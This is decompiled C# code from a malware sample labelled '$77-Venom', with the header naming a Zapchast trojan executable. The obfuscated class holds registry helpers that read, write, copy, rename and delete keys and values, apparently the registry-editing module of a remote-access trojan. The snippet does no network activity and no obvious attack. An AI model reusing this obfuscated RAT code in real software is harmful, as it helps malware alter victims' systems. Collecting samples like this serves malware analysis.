// Decompiled with JetBrains decompiler
// Type: ㅌ歷䢎ⵀ㙸孫⭐딿猑�䩍훣諂�く妢諮튲
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Zapchast.gen-815b2bf1ddadfb46a27001e08246e8f82f629eb793963bef856d17e1ef9c4085.exe

using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;

public static class ㅌ歷䢎ⵀ㙸孫\u2B50딿\uE62C猑\uFFFD䩍훣諂\uFFFDく妢\uEB25諮튲
{
  private static bool IsNameOrValueNull(this string keyName, RegistryKey key) => string.IsNullOrEmpty(keyName) || key == null;

  public static string GetValueSafe(this RegistryKey key, string keyName, string defaultValue = "")
  {
    try
    {
      return key.GetValue(keyName, (object) defaultValue).ToString();
    }
    catch
    {
      return defaultValue;
    }
  }

  public static RegistryKey OpenReadonlySubKeySafe(this RegistryKey key, string name)
  {
    try
    {
      return key.OpenSubKey(name, false);
    }
    catch
    {
      return (RegistryKey) null;
    }
  }

  public static RegistryKey OpenWritableSubKeySafe(this RegistryKey key, string name)
  {
    try
    {
      return key.OpenSubKey(name, true);
    }
    catch
    {
      return (RegistryKey) null;
    }
  }

  public static RegistryKey CreateSubKeySafe(this RegistryKey key, string name)
  {
    try
    {
      return key.CreateSubKey(name);
    }
    catch
    {
      return (RegistryKey) null;
    }
  }

  public static bool DeleteSubKeyTreeSafe(this RegistryKey key, string name)
  {
    try
    {
      key.DeleteSubKeyTree(name, true);
      return true;
    }
    catch
    {
      return false;
    }
  }

  public static bool RenameSubKeySafe(this RegistryKey key, string oldName, string newName)
  {
    try
    {
      key.CopyKey(oldName, newName);
      key.DeleteSubKeyTree(oldName);
      return true;
    }
    catch
    {
      key.DeleteSubKeyTreeSafe(newName);
      return false;
    }
  }

  public static void CopyKey(this RegistryKey key, string oldName, string newName)
  {
    using (RegistryKey subKey = key.CreateSubKey(newName))
    {
      using (RegistryKey sourceKey = key.OpenSubKey(oldName, true))
        ㅌ歷䢎ⵀ㙸孫\u2B50딿\uE62C猑\uFFFD䩍훣諂\uFFFDく妢\uEB25諮튲.齰\u2A68첏恏۫䞥ଈ\u22D1憒\u2ED5췩\u0C72윜忧ꅋ븗Ө昔\uEA0D\u2704(sourceKey, subKey);
    }
  }

  private static void 齰\u2A68첏恏۫䞥ଈ\u22D1憒\u2ED5췩\u0C72윜忧ꅋ븗Ө昔\uEA0D\u2704(
    RegistryKey sourceKey,
    RegistryKey destKey)
  {
    foreach (string valueName in sourceKey.GetValueNames())
    {
      object obj = sourceKey.GetValue(valueName);
      RegistryValueKind valueKind = sourceKey.GetValueKind(valueName);
      destKey.SetValue(valueName, obj, valueKind);
    }
    foreach (string subKeyName in sourceKey.GetSubKeyNames())
    {
      using (RegistryKey sourceKey1 = sourceKey.OpenSubKey(subKeyName))
      {
        using (RegistryKey subKey = destKey.CreateSubKey(subKeyName))
          ㅌ歷䢎ⵀ㙸孫\u2B50딿\uE62C猑\uFFFD䩍훣諂\uFFFDく妢\uEB25諮튲.齰\u2A68첏恏۫䞥ଈ\u22D1憒\u2ED5췩\u0C72윜忧ꅋ븗Ө昔\uEA0D\u2704(sourceKey1, subKey);
      }
    }
  }

  public static bool SetValueSafe(
    this RegistryKey key,
    string name,
    object data,
    RegistryValueKind kind)
  {
    try
    {
      key.SetValue(name, data, kind);
      return true;
    }
    catch
    {
      return false;
    }
  }

  public static bool DeleteValueSafe(this RegistryKey key, string name)
  {
    try
    {
      key.DeleteValue(name);
      return true;
    }
    catch
    {
      return false;
    }
  }

  public static bool RenameValueSafe(this RegistryKey key, string oldName, string newName)
  {
    try
    {
      key.CopyValue(oldName, newName);
      key.DeleteValue(oldName);
      return true;
    }
    catch
    {
      key.DeleteValueSafe(newName);
      return false;
    }
  }

  public static void CopyValue(this RegistryKey key, string oldName, string newName)
  {
    RegistryValueKind valueKind = key.GetValueKind(oldName);
    object obj = key.GetValue(oldName);
    key.SetValue(newName, obj, valueKind);
  }

  public static bool ContainsSubKey(this RegistryKey key, string name)
  {
    foreach (string subKeyName in key.GetSubKeyNames())
    {
      if (subKeyName == name)
        return true;
    }
    return false;
  }

  public static bool ContainsValue(this RegistryKey key, string name)
  {
    foreach (string valueName in key.GetValueNames())
    {
      if (valueName == name)
        return true;
    }
    return false;
  }

  public static IEnumerable<string> GetFormattedKeyValues(this RegistryKey key)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: variable of a compiler-generated type
    ㅌ歷䢎ⵀ㙸孫\u2B50딿\uE62C猑\uFFFD䩍훣諂\uFFFDく妢\uEB25諮튲.충ِ䯙\uF206斛\uFFFD훥횷\uF64F縷ﱮ녟뀡厧쐨甼傹ண蘜圍 충ِ䯙斛훥횷縷ﱮ녟뀡厧쐨甼傹ண蘜圍 = new ㅌ歷䢎ⵀ㙸孫\u2B50딿\uE62C猑\uFFFD䩍훣諂\uFFFDく妢\uEB25諮튲.충ِ䯙\uF206斛\uFFFD훥횷\uF64F縷ﱮ녟뀡厧쐨甼傹ண蘜圍();
    // ISSUE: reference to a compiler-generated field
    충ِ䯙斛훥횷縷ﱮ녟뀡厧쐨甼傹ண蘜圍.漦氫\uF7E3祎\uFFFDఉ㩻㩳\u336A豋\uD7FE캁풭ڗﬂೡ\u301C眳ἃ\uEF82 = key;
    // ISSUE: reference to a compiler-generated field
    if (충ِ䯙斛훥횷縷ﱮ녟뀡厧쐨甼傹ண蘜圍.漦氫\uF7E3祎\uFFFDఉ㩻㩳\u336A豋\uD7FE캁풭ڗﬂೡ\u301C眳ἃ\uEF82 != null)
    {
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated method
      foreach (string keyName in ((IEnumerable<string>) 충ِ䯙斛훥횷縷ﱮ녟뀡厧쐨甼傹ண蘜圍.漦氫\uF7E3祎\uFFFDఉ㩻㩳\u336A豋\uD7FE캁풭ڗﬂೡ\u301C眳ἃ\uEF82.GetValueNames()).Where<string>(충ِ䯙斛훥횷縷ﱮ녟뀡厧쐨甼傹ண蘜圍.몧䚩솼\uF567鬶͘荦㱘錹\uE70F䑵硻湳啸밼ꦂﶃ\u2E6C쌤\u2B37 ?? (충ِ䯙斛훥횷縷ﱮ녟뀡厧쐨甼傹ண蘜圍.몧䚩솼\uF567鬶͘荦㱘錹\uE70F䑵硻湳啸밼ꦂﶃ\u2E6C쌤\u2B37 = new Func<string, bool>(충ِ䯙斛훥횷縷ﱮ녟뀡厧쐨甼傹ண蘜圍.\uECFEय戟갉袶ⳟᇃ䥓묫솦㒐\uFFFD㻥᪷ᩈ\uF851\uE56B撁ꦨໄ))).Where<string>((Func<string, bool>) (k => !string.IsNullOrEmpty(k))))
      {
        // ISSUE: reference to a compiler-generated field
        yield return string.Format("{0}||{1}", (object) keyName, (object) 충ِ䯙斛훥횷縷ﱮ녟뀡厧쐨甼傹ண蘜圍.漦氫\uF7E3祎\uFFFDఉ㩻㩳\u336A豋\uD7FE캁풭ڗﬂೡ\u301C眳ἃ\uEF82.GetValueSafe(keyName));
      }
    }
  }

  public static object GetDefault(this RegistryValueKind valueKind)
  {
    switch (valueKind)
    {
      case RegistryValueKind.String:
      case RegistryValueKind.ExpandString:
        return (object) "";
      case RegistryValueKind.Binary:
        return (object) new byte[0];
      case RegistryValueKind.DWord:
        return (object) 0;
      case RegistryValueKind.MultiString:
        return (object) new string[0];
      case RegistryValueKind.QWord:
        return (object) 0L;
      default:
        return (object) null;
    }
  }
}
